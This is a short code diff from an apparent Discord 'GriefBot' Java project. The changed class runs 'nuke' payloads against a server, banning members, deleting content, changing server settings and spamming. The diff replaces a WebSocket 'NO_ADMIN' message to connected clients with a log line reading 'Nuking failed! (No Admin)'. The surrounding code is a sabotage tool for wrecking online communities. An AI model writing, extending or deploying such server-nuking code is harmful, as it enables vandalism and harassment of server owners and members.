@@ -1,8 +1,8 @@
 package de.corruptedbytes.payload;
 
-import org.java_websocket.WebSocket;
-
 import de.corruptedbytes.GriefBot;
+import de.corruptedbytes.logger.GriefBotLogger;
+import de.corruptedbytes.logger.GriefBotLoggerLevel;
 import de.corruptedbytes.payload.impl.PayloadBanMembers;
 import de.corruptedbytes.payload.impl.PayloadDelete;
 import de.corruptedbytes.payload.impl.PayloadServerChange;
@@ -35,9 +35,7 @@ public class GriefBotPayload {
 			runTask(new PayloadDelete(guild, griefMessage));
 			runTask(new PayloadSpam(guild, griefMessage));
 		} else {
-			for (WebSocket webSocket : GriefBot.getInstance().getClients()) {
-				webSocket.send("NO_ADMIN|" + guild.getId());
-			}
+			GriefBotLogger.log("[GriefBot/NukeRequest] Nuking failed! (No Admin)", GriefBotLoggerLevel.ERROR);
 		}
 	}
 	
